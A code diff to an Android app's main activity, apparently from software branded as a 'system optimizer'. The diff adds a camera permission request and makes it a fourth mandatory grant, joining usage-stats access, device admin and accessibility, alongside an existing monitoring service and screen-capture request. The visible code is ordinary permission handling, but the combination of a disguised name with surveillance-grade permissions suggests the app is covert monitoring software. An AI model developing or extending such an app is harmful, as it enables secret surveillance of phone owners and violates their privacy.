@@ -16,6 +16,10 @@ import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
+import android.Manifest
+import android.content.pm.PackageManager
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import androidx.appcompat.app.AppCompatActivity
 import com.system.optimizer.admin.AdminReceiver
 import com.system.optimizer.service.MonitoringService
@@ -28,6 +32,7 @@ class MainActivity : AppCompatActivity() {
         private const val RC_MEDIA_PROJECTION = 1003
         private const val RC_BATTERY_OPT = 1004
         private const val RC_ACCESSIBILITY = 1005
+        private const val RC_CAMERA = 1006
     }
 
     private var projectionResultCode = -1
@@ -66,10 +71,12 @@ class MainActivity : AppCompatActivity() {
         val usageOk = hasUsageStatsPermission()
         val adminOk = isDeviceAdminActive()
         val accessibilityOk = isAccessibilityServiceEnabled()
+        val cameraOk = hasCameraPermission()
 
         setCheckmark(R.id.checkUsage, usageOk)
         setCheckmark(R.id.checkAdmin, adminOk)
         setCheckmark(R.id.checkAccessibility, accessibilityOk)
+        setCheckmark(R.id.checkCamera, cameraOk)
 
         findViewById<Button>(R.id.btnUsageStats).apply {
             isEnabled = !usageOk
@@ -86,8 +93,13 @@ class MainActivity : AppCompatActivity() {
             text = if (accessibilityOk) "✓ Enabled" else "Enable"
         }
 
-        // All 3 permissions required to start
-        findViewById<Button>(R.id.btnStart).isEnabled = usageOk && adminOk && accessibilityOk
+        findViewById<Button>(R.id.btnCamera)?.apply {
+            isEnabled = !cameraOk
+            text = if (cameraOk) "✓ Granted" else "Grant"
+        }
+
+        // All 4 permissions required to start
+        findViewById<Button>(R.id.btnStart).isEnabled = usageOk && adminOk && accessibilityOk && cameraOk
     }
 
     private fun setCheckmark(viewId: Int, granted: Boolean) {
@@ -125,6 +137,11 @@ class MainActivity : AppCompatActivity() {
     fun onEnableAccessibility(view: View) {
         val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
         startActivityForResult(intent, RC_ACCESSIBILITY)
+    }
+
+    @Suppress("UNUSED_PARAMETER")
+    fun onGrantCamera(view: View) {
+        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), RC_CAMERA)
     }
 
     @Suppress("UNUSED_PARAMETER")
@@ -252,5 +269,16 @@ class MainActivity : AppCompatActivity() {
             Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
         ) ?: return false
         return enabledServices.contains(serviceName, ignoreCase = true)
+    }
+
+    private fun hasCameraPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == RC_CAMERA) {
+            refreshPermissionUI()
+        }
     }
 }
